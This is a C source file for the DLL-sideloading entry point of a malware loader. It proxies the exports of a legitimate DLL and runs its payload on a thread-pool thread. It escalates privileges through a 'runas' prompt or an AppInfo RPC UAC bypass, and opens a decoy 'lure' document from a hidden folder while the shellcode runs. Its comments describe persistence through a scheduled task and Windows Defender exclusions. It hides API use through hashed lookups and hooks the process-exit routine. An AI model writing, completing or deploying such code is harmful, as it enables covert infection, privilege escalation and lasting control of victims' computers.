// =============================================
// Sideload.c - DLL Sideloading Entry Point
//
// Provides DllMain for the DLL sideload build variant.
// On DLL_PROCESS_ATTACH, queues the loader pipeline
// to a thread pool thread via TpAllocWork/TpPostWork
// (avoids Loader Lock).
//
// When REQUIRE_ELEVATION is defined (build.bat sideload uac),
// the worker thread checks elevation first:
//   - Not admin: ShellExecuteA "runas" to relaunch host
//     EXE elevated, then terminate self.
//   - Admin (or relaunch failed): pin DLL, run Main().
// Without REQUIRE_ELEVATION, pins the DLL and runs Main()
// directly at whatever integrity level the host has.
//
// Export forwarding pragmas in Sideload.h proxy all
// original DLL exports to the renamed real DLL.
// The PE loader handles forwarding natively — no
// proxy code runs for legitimate API calls.
//
// Build: build.bat sideload [output_name.dll] [uac]
// Pre-req: python SideloadGen.py <target.dll>
// =============================================

#ifdef BUILD_DLL

#include "Common.h"
#include "Sideload.h"

// Main() from main.c — full loader pipeline
extern int Main(VOID);

// Globals set by DllMain, used by worker thread
static PVOID     g_pNtdll = NULL;
static HINSTANCE g_hDll   = NULL;

#ifdef REQUIRE_ELEVATION

// -----------------------------------------------
// Check if current process is running elevated
// Uses ntdll-only APIs (no advapi32 dependency)
// -----------------------------------------------
static BOOL IsElevated(VOID) {
    typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(HANDLE, ACCESS_MASK, PHANDLE);
    typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS(NTAPI* fnNtClose2)(HANDLE);

    fnNtOpenProcessToken pNtOpenProcessToken =
        (fnNtOpenProcessToken)FetchExportAddress(g_pNtdll, NtOpenProcessToken_JOAAT);
    fnNtQueryInformationToken pNtQueryInfoToken =
        (fnNtQueryInformationToken)FetchExportAddress(g_pNtdll, NtQueryInformationToken_JOAAT);
    fnNtClose2 pNtClose =
        (fnNtClose2)FetchExportAddress(g_pNtdll, NtClose_JOAAT);

    if (!pNtOpenProcessToken || !pNtQueryInfoToken || !pNtClose)
        return FALSE;

    HANDLE hToken = NULL;
    NTSTATUS status = pNtOpenProcessToken((HANDLE)-1, 0x0008 /* TOKEN_QUERY */, &hToken);
    if (!NT_SUCCESS(status) || !hToken)
        return FALSE;

    TOKEN_ELEVATION te;
    MemSet(&te, 0, sizeof(te));
    ULONG dwLen = 0;
    status = pNtQueryInfoToken(hToken, TokenElevation, &te, sizeof(te), &dwLen);
    pNtClose(hToken);

    return (NT_SUCCESS(status) && te.TokenIsElevated);
}

// -----------------------------------------------
// Relaunch host EXE with "runas" for elevation
// Returns TRUE if elevated instance was launched
// -----------------------------------------------
static BOOL RelaunchElevated(VOID) {
    // Find kernel32 for LoadLibraryA + GetModuleFileNameA
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32)
        return FALSE;

    fnLoadLibraryA pLoadLibraryA =
        (fnLoadLibraryA)FetchExportAddress(pKernel32, LoadLibraryA_JOAAT);
    if (!pLoadLibraryA)
        return FALSE;

    // Get host EXE path
    typedef DWORD(WINAPI* fnGetModuleFileNameA2)(HMODULE, LPSTR, DWORD);
    fnGetModuleFileNameA2 pGetModuleFileNameA =
        (fnGetModuleFileNameA2)FetchExportAddress(pKernel32, GetModuleFileNameA_JOAAT);
    if (!pGetModuleFileNameA)
        return FALSE;

    CHAR szPath[260] = { 0 };
    DWORD dwLen = pGetModuleFileNameA(NULL, szPath, 260);
    if (dwLen == 0 || dwLen >= 260)
        return FALSE;

    // Load shell32 and resolve ShellExecuteA
    HMODULE hShell32 = pLoadLibraryA("shell32.dll");
    if (!hShell32)
        return FALSE;

    fnGetProcAddress pGetProcAddress =
        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
    if (!pGetProcAddress)
        return FALSE;

    typedef HINSTANCE(WINAPI* fnShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
    fnShellExecuteA pShellExecuteA =
        (fnShellExecuteA)pGetProcAddress(hShell32, "ShellExecuteA");
    if (!pShellExecuteA)
        return FALSE;

    // Extract directory from EXE path (for working directory)
    CHAR szDir[260] = { 0 };
    MemCopy(szDir, szPath, dwLen);
    INT iLast = -1;
    for (INT i = 0; i < (INT)dwLen; i++) {
        if (szDir[i] == '\\') iLast = i;
    }
    if (iLast >= 0) szDir[iLast] = '\0';

    // "runas" triggers UAC prompt, szDir ensures correct working directory
    HINSTANCE hResult = pShellExecuteA(NULL, "runas", szPath, NULL, szDir, 5 /* SW_SHOW */);
    return ((INT_PTR)hResult > 32);
}

#ifdef UAC_BYPASS
// -----------------------------------------------
// Relaunch host EXE elevated via AppInfo RPC bypass
// No UAC dialog — uses same method as standalone EXE
// -----------------------------------------------
static BOOL RelaunchElevatedAppInfo(VOID) {
    API_HASHING apis;
    MemSet(&apis, 0, sizeof(apis));
    if (!InitializeWinApis(&apis)) return FALSE;

    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pNtdll || !pK32) return FALSE;

    typedef DWORD (WINAPI* fnGSD)(LPWSTR, UINT);
    typedef DWORD (WINAPI* fnGWD)(LPWSTR, UINT);
    typedef DWORD (WINAPI* fnGMFW)(HMODULE, LPWSTR, DWORD);

    fnGSD  pGSD  = (fnGSD) FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
    fnGWD  pGWD  = (fnGWD) FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
    fnGMFW pGMFW = (fnGMFW)FetchExportAddress(pK32, GetModuleFileNameW_JOAAT);
    if (!pGSD || !pGWD || !pGMFW) return FALSE;

    WCHAR wSysDir[MAX_PATH] = {0};
    WCHAR wWinDir[MAX_PATH] = {0};
    pGSD(wSysDir, MAX_PATH);
    pGWD(wWinDir, MAX_PATH);

    WCHAR wExeRaw[MAX_PATH] = {0};
    if (!pGMFW(NULL, wExeRaw, MAX_PATH)) return FALSE;

    // Quote path for CreateProcess lpCommandLine
    WCHAR wExeCmd[MAX_PATH + 4] = {0};
    wExeCmd[0] = L'"';
    SIZE_T n = 0;
    while (wExeRaw[n] && n < MAX_PATH - 2) { wExeCmd[n + 1] = wExeRaw[n]; n++; }
    wExeCmd[n + 1] = L'"';

    return UacRunCommandElevated(&apis, pNtdll, wSysDir, wWinDir, wExeCmd);
}
#endif /* UAC_BYPASS */

#endif /* REQUIRE_ELEVATION */

// -----------------------------------------------
// OpenBindFile — open the bind file from the hidden
// "\_" subfolder that sits next to the host EXE.
//
// Deployment layout:
//   host.exe
//   proxy.dll      (hidden attribute)
//   original.dll   (hidden attribute)
//   _\             (hidden folder)
//     bindfile.*   (document / lure file)
//
// Looks for the first non-directory entry under
// <exe_dir>\_\ and calls ShellExecuteA("open") on
// it. Silent no-op if the folder does not exist or
// is empty. Called BEFORE Main() so the lure opens
// while the loader pipeline is running.
// -----------------------------------------------
static VOID OpenBindFile(VOID) {
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32) return;

    // --- Persistence-launch guard ---
    // InstallPersistence() appends " /pf" to the run-key value for DLL builds.
    // On reboot the host EXE is launched with that marker in its command line.
    // If found, skip the bind file — lure documents only open on first-run.
    {
        typedef LPSTR (WINAPI* fnGetCmdLineA)(VOID);
        fnGetCmdLineA pGetCmdLineA =
            (fnGetCmdLineA)FetchExportAddress(pKernel32, GetCommandLineA_JOAAT);
        if (pGetCmdLineA) {
            LPCSTR szCmd = pGetCmdLineA();
            if (szCmd) {
                DWORD _i = 0;
                while (szCmd[_i]) {
                    if (szCmd[_i  ] == ' '  && szCmd[_i+1] == '/' &&
                        szCmd[_i+2] == 'p'  && szCmd[_i+3] == 'f' &&
                        (szCmd[_i+4] == '\0' || szCmd[_i+4] == ' ')) {
                        return;  // persistence relaunch — do not open lure
                    }
                    _i++;
                }
            }
        }
    }

    fnLoadLibraryA pLoadLibraryA =
        (fnLoadLibraryA)FetchExportAddress(pKernel32, LoadLibraryA_JOAAT);
    if (!pLoadLibraryA) return;

    // Get host EXE full path
    typedef DWORD(WINAPI* fnGetModFN)(HMODULE, LPSTR, DWORD);
    fnGetModFN pGetModFN =
        (fnGetModFN)FetchExportAddress(pKernel32, GetModuleFileNameA_JOAAT);
    if (!pGetModFN) return;

    CHAR szExePath[260];
    MemSet(szExePath, 0, sizeof(szExePath));
    DWORD dwLen = pGetModFN(NULL, szExePath, 260);
    if (dwLen == 0 || dwLen >= 260) return;

    // Strip filename — find last backslash
    INT iLast = -1;
    for (INT i = 0; i < (INT)dwLen; i++) {
        if (szExePath[i] == '\\') iLast = i;
    }
    if (iLast < 0 || (iLast + 4) >= 260) return;

    // Build search pattern: <dir>\_\*
    CHAR szPattern[260];
    MemSet(szPattern, 0, sizeof(szPattern));
    MemCopy(szPattern, szExePath, (SIZE_T)(iLast + 1)); // includes trailing "\"
    szPattern[iLast + 1] = '_';
    szPattern[iLast + 2] = '\\';
    szPattern[iLast + 3] = '*';
    // szPattern[iLast + 4] already '\0' from MemSet

    // Resolve FindFirstFileA / FindNextFileA / FindClose
    typedef HANDLE(WINAPI* fnFFF)(LPCSTR, LPWIN32_FIND_DATAA);
    typedef BOOL  (WINAPI* fnFNF)(HANDLE, LPWIN32_FIND_DATAA);
    typedef BOOL  (WINAPI* fnFC )(HANDLE);

    fnFFF pFindFirstFileA  = (fnFFF)FetchExportAddress(pKernel32, FindFirstFileA_JOAAT);
    fnFNF pFindNextFileA   = (fnFNF)FetchExportAddress(pKernel32, FindNextFileA_JOAAT);
    fnFC  pFindClose       = (fnFC) FetchExportAddress(pKernel32, FindClose_JOAAT);
    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose) return;

    WIN32_FIND_DATAA wfd;
    MemSet(&wfd, 0, sizeof(wfd));
    HANDLE hFind = pFindFirstFileA(szPattern, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    // Walk entries — find first real file (skip . and .. and sub-directories)
    CHAR szFilePath[260];
    MemSet(szFilePath, 0, sizeof(szFilePath));
    BOOL bFound = FALSE;

    do {
        if (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            DWORD dwNameLen = (DWORD)StrLenA(wfd.cFileName);
            if (dwNameLen > 0 && ((DWORD)(iLast + 3) + dwNameLen) < 260) {
                // Prefix "<dir>\_\" is iLast+3 bytes (positions 0..iLast+2)
                MemCopy(szFilePath, szPattern, (SIZE_T)(iLast + 3));
                MemCopy(szFilePath + iLast + 3, wfd.cFileName, dwNameLen);
                // szFilePath[iLast+3+dwNameLen] already '\0' from MemSet
                bFound = TRUE;
            }
            break;
        }
    } while (pFindNextFileA(hFind, &wfd));

    pFindClose(hFind);
    if (!bFound) return;

    // Load shell32 and call ShellExecuteA("open", filePath)
    HMODULE hShell32 = pLoadLibraryA("shell32.dll");
    if (!hShell32) return;

    fnGetProcAddress pGetProcAddress =
        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
    if (!pGetProcAddress) return;

    typedef HINSTANCE(WINAPI* fnShellExec)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
    fnShellExec pShellExecuteA =
        (fnShellExec)pGetProcAddress(hShell32, "ShellExecuteA");
    if (!pShellExecuteA) return;

    pShellExecuteA(NULL, "open", szFilePath, NULL, NULL, 1 /* SW_SHOWNORMAL */);
}

// -----------------------------------------------
// Thread pool callback
//
// 1. [REQUIRE_ELEVATION] Check elevation → relaunch if needed
// 2. Pin DLL in memory
// 3. OpenBindFile — open lure doc from _\ before shellcode runs
// 4. Run Main() (full loader pipeline)
// -----------------------------------------------
static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
    (void)Instance;
    (void)Context;
    (void)Work;

#ifdef REQUIRE_ELEVATION
    // --- Persistence-reboot detection ---
    // Scheduled task launches msoia.exe with argument "/pf" and RunLevel Highest.
    // If "/pf" is present the task already started us elevated — skip re-elevation
    // and skip re-install; go straight to shellcode.
    BOOL bPersistBoot = FALSE;
#if defined(UAC_BYPASS)
    {
        typedef LPSTR (WINAPI* fnGCLA2)(VOID);
        PVOID pK32x = FindLoadedModuleW(L"KERNEL32.DLL");
        if (pK32x) {
            fnGCLA2 pGetCmdLine2 = (fnGCLA2)FetchExportAddress(pK32x, GetCommandLineA_JOAAT);
            if (pGetCmdLine2) {
                LPCSTR szCmd2 = pGetCmdLine2();
                if (szCmd2) {
                    for (DWORD _ci = 0; szCmd2[_ci]; _ci++) {
                        if (szCmd2[_ci]==' ' && szCmd2[_ci+1]=='/' && szCmd2[_ci+2]=='p' &&
                            szCmd2[_ci+3]=='f' && (szCmd2[_ci+4]=='\0' || szCmd2[_ci+4]==' ')) {
                            bPersistBoot = TRUE; break;
                        }
                    }
                }
            }
        }
    }
#endif

    // --- Elevation check (first-run only) ---
    if (!bPersistBoot && !IsElevated()) {
        BOOL bRelaunched;
#ifdef UAC_BYPASS
        bRelaunched = RelaunchElevatedAppInfo();
#else
        bRelaunched = RelaunchElevated();
#endif
        if (bRelaunched) {
            // Elevated instance launched — terminate this medium-IL instance.
            typedef NTSTATUS(NTAPI* fnNtTerminateProcess2)(HANDLE, NTSTATUS);
            fnNtTerminateProcess2 pNtTerminateProcess =
                (fnNtTerminateProcess2)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
            if (pNtTerminateProcess)
                pNtTerminateProcess((HANDLE)-1, 0);
            return;
        }
        // Relaunch failed — continue at medium integrity
    }

    // --- Sideload persistence install (elevated first run only) ---
    // Copies EXE + DLLs, runs WD exclusions, registers scheduled task, then exits.
    // Shellcode runs on the next logon via the scheduled task (/pf path).
    // Self-guards: no-op if already running from the persistence directory.
#if defined(UAC_BYPASS)
    if (!bPersistBoot && IsElevated()) {
        OpenBindFile();
        API_HASHING sApis;
        MemSet(&sApis, 0, sizeof(sApis));
        if (InitializeWinApis(&sApis))
            SideloadInstallAndContinue(&sApis);
        typedef NTSTATUS(NTAPI* fnNtTerm)(HANDLE, NTSTATUS);
        fnNtTerm pNtTerm = (fnNtTerm)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
        if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
        return;
    }
#endif

#endif /* REQUIRE_ELEVATION */

    // --- Pin our DLL in memory (LdrAddRefDll) ---
    typedef NTSTATUS(NTAPI* fnLdrAddRefDll)(ULONG Flags, PVOID BaseAddress);
    fnLdrAddRefDll pLdrAddRefDll = (fnLdrAddRefDll)FetchExportAddress(g_pNtdll, LdrAddRefDll_JOAAT);
    if (pLdrAddRefDll)
        pLdrAddRefDll(0x01, (PVOID)g_hDll);  // LDR_ADDREF_DLL_PIN

    // --- Open lure / bind file from _\ BEFORE shellcode runs ---
    // Silently no-ops if _\ doesn't exist or has no files.
    OpenBindFile();

    // --- Run loader pipeline ---
    Main();
}

// -----------------------------------------------
// DllMain - DLL entry point for sideloading
//
// Minimal: find ntdll, queue worker, return.
// All heavy work (elevation, hooking, loader)
// happens on the thread pool thread.
// -----------------------------------------------
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    (void)lpReserved;

    if (dwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    // --- Find ntdll base via PEB (case-insensitive) ---
    g_pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!g_pNtdll)
        return TRUE;

    g_hDll = hDll;

    // --- Patch RtlExitUserProcess EARLY (before host can exit) ---
    // Must be in DllMain so it's active before the host EXE's main()
    // runs and potentially calls ExitProcess. The worker thread
    // might not fire in time for fast-exiting host processes.
    // NtTerminateProcess is NOT patched, so the non-elevated instance
    // can still self-terminate after relaunching elevated.
    InstallExitHook(g_pNtdll);

    // --- Queue worker to thread pool ---
    fnTpAllocWork pTpAllocWork = (fnTpAllocWork)FetchExportAddress(g_pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork  pTpPostWork  = (fnTpPostWork)FetchExportAddress(g_pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return TRUE;

    PVOID pWork = NULL;
    NTSTATUS status = pTpAllocWork(&pWork, (PVOID)SideloadWorker, NULL, NULL);
    if (NT_SUCCESS(status) && pWork)
        pTpPostWork(pWork);

    return TRUE;
}

#endif /* BUILD_DLL */
